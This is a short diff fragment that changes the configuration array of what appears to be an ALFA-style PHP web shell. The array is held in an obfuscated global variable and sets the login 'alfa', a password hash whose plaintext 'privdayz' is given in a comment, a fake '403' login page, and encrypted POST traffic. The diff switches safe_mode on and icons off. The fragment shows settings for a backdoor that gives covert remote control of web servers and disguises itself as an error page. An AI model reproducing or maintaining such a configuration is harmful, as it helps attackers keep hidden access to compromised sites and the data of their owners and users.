@@ -2,9 +2,9 @@
 $GLOBALS['oZgNypoPRU'] = array(
     'username' => 'alfa',
     'password' => 'b71c31bca4b9d422190405c8f24049fb',//password: privdayz
-    'safe_mode' => '0',
+    'safe_mode' => '1',
     'login_page' => '403',
-    'show_icons' => '1',
+    'show_icons' => '0',
     'post_encryption' => true,
     'cgi_api' => false,
 );
